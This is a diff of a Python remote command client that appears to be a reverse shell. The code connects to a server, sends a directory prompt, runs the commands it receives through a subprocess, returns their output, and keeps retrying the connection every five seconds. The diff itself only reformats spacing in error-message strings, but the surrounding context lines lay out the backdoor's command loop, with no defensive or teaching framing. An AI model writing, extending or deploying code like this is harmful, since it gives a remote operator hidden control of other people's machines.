@@ -67,7 +67,7 @@ class Client(object):
         try:
             self.socket.recv(10)
         except Exception as e:
-            print('Could not start communication with server: %s\n' %str(e))
+            print('Could not start communication with server: %s\n' % str(e))
             return
         cwd = str.encode(str(os.getcwd()) + '> ')
         self.socket.send(struct.pack('>I', len(cwd)) + cwd)
@@ -80,7 +80,7 @@ class Client(object):
                 try:
                     os.chdir(directory.strip())
                 except Exception as e:
-                    output_str = "Could not change directory: %s\n" %str(e)
+                    output_str = "Could not change directory: %s\n" % str(e)
                 else:
                     output_str = ""
             elif data[:].decode("utf-8") == 'quit':
@@ -94,12 +94,12 @@ class Client(object):
                     output_bytes = cmd.stdout.read() + cmd.stderr.read()
                     output_str = output_bytes.decode("utf-8", errors="replace")
                 except Exception as e:
-                    output_str = "Command execution unsuccessful: %s\n" %str(e)
+                    output_str = "Command execution unsuccessful: %s\n" % str(e)
             if output_str is not None:
                 try:
                     self.print_output(output_str)
                 except Exception as e:
-                    print('Cannot send command output: %s' %str(e))
+                    print('Cannot send command output: %s' % str(e))
         self.socket.close()
         return
 
@@ -112,7 +112,7 @@ def main():
         try:
             client.socket_connect()
         except Exception as e:
-            print("Error on socket connections: %s" %str(e))
+            print("Error on socket connections: %s" % str(e))
             time.sleep(5)
         else:
             break
